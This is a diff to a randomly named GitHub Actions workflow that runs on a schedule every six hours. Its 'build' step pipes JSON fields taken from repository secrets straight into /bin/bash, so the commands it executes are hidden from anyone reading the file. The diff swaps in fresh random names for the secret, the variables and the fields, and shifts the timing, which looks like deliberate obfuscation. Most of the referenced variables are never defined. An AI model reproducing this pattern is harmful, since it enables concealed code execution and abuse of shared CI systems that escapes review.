@@ -3,8 +3,7 @@ name: hukaljx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 5/6 * * *'
-
+    - cron: '15 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,24 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: hukaljx
         env:
-          aydtm32503: ${{ secrets.aydtm32503 }}
+          v502: ${{ secrets.v502 }}
         run: |
-          echo $aydtm32503 | jq -r .u14 | /bin/bash
-          echo $ja42109 | jq -r .glpc76 | /bin/bash
-          echo $ql217 | jq -r .cbjix2118 | /bin/bash
-          echo $hyus1832 | jq -r .bwzzr8341 | /bin/bash
-          echo $uchk0 | jq -r .q173 | /bin/bash
-          echo $mch781 | jq -r .vzc53 | /bin/bash
-          echo $t648 | jq -r .pmtup1879 | /bin/bash
-          echo $dut8397 | jq -r .fqor85 | /bin/bash
-          echo $xu583 | jq -r .f5 | /bin/bash
-          echo $kla9 | jq -r .yjfyt2 | /bin/bash
-          echo $wdo87301 | jq -r .gp145 | /bin/bash
-          echo $ohbx815 | jq -r .ep61286 | /bin/bash
-          echo $q9552 | jq -r .qu44 | /bin/bash
-          echo $e67809 | jq -r .k44 | /bin/bash
-          echo $bb29 | jq -r .qlwu69119 | /bin/bash
-          echo $ep72 | jq -r .pro10065 | /bin/bash
-          echo $qpt63 | jq -r .iya1805 | /bin/bash
-          echo $oyp97 | jq -r .liqi4 | /bin/bash
+          echo $v502 | jq -r .q61029 | /bin/bash
+          echo $lcpoc5999 | jq -r .qxf238 | /bin/bash
+          echo $efvj14474 | jq -r .mrj0090 | /bin/bash
+          echo $u7 | jq -r .vqc94 | /bin/bash
+          echo $yts130 | jq -r .zfi7 | /bin/bash
+          echo $vgzgr7968 | jq -r .uaq02 | /bin/bash
+          echo $qfa65527 | jq -r .akbnz2 | /bin/bash
 
